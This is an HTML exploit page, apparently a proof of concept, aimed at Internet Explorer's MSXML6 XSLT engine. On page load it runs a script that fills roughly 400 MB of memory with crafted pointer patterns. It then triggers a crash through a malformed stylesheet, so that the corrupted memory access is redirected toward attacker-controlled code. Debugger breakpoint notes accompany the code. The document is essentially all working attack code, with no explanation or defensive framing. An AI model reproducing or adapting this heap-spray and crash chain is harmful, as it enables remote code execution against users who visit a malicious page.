<!doctype html>
<html>
<head>

<script>

function crash() 
{
	xslcontent='<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template name="main_template" match="/"><xsl:for-each select="*"><xsl:apply-templates/></xsl:for-each></xsl:template><xsl:template name="xx" match="x[position()]" /></xsl:stylesheet>';

	srcTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
	xsltTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
	xsltTree.loadXML(xslcontent);
	alert("crash");
	srcTree.transformNode(xsltTree);	
}

function selfpatch() 
{
// !!! +hpa required !!!
// bp msxml6!xengine::stns;bp msxml6!xengine::brns;g;

	var intArr = new Array;
	intArr[0] = 0x01c0ffee; // marker // s 0 l?80000000 ee ff c0 01

	var count = (0x19000000-0x20)/4; // 400 Mb 

	// ptr0(crashing)->ptr1->ptr2->shellcode // 0x3a..0x40.. -> 0x3838xxxx -> 0x3838yyyy -> patch or shellcode

	var pbyte = 0x38; // play with me
	var ptr12base = (pbyte<<24)+(pbyte<<16);  //0x38380000 // landing for the initial memory access
	var ptr1 = 0; // calculated from the page offset
	var ptr2 = 0; // calculated from the page offset
	var ptrcall = 0x54545454; // 0x5454xxxx -> pointers to shellcode

	var delta = 0x3300; // added and removed to segregate the 1st and the 2nd memory access areas within the pattern
	// the additional bits above 0x1000 are used to enforce the successful 1-byte misaligned memory access

	for(var i=1; i<=count; i++)
	{
		var i_pattern = i*4%0x1000; // index into the current page

		// let’s fill the spray tail with plain pointers to call
		if ( i>(0x12000000/4) ) // which defines where the ‘tail’ begins (chosen empirically)
		{
			intArr[i] = 0x00badd1e; 
			continue;
		}

		ptr1 = (i_pattern - 8 + 0x20 + delta); 
		ptr2 = (i_pattern - 4 + 0x20 - (delta&0xfff)); 

		// misaligned memory access: fallback to code exec  
		if ( ((i*4+0x20)&0xff) == (pbyte+4) ) 
			intArr[i] = ptrcall;

		// well aligned memory access: restore the pointers
		else if (i_pattern < 0x0700)
			intArr[i] = ptr12base + ptr1;	
		else 
			intArr[i] = ptr12base + ptr2;
	}

	crash();  
	alert("Look, no calc!");
}

function factorial(n) 
{
	if (n == 0) 
	{
		selfpatch();
        	return 1;
    	} 
	else 
		return n * factorial(n - 1);
}
</script>
</head>

<body onload="factorial(30);">
	<form id="a">
	</form>
	<dfn id="b">
	</dfn>
<div id="resTree"></div>

</body>
</html>
